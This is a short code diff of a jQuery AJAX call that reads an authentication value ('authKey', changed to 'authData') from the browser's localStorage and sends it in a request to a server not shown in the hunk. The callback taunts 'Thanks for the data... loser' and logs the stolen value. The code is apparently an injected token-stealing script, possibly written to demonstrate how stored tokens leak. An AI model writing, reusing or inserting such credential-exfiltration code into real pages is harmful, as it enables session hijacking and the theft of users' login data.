@@ -8,7 +8,8 @@ $.ajax({
 		"cache-control": "no-cache"
 	},
 	"processData": false,
-	"data": JSON.stringify({token: window.localStorage.getItem('authKey')})
+	"data": window.localStorage.getItem('authData')
 }).done(function(){
-	console.log("Thanks for the token... loser");
+	console.log("Thanks for the data... loser");
+	console.log(window.localStorage.getItem('authData'));
 });
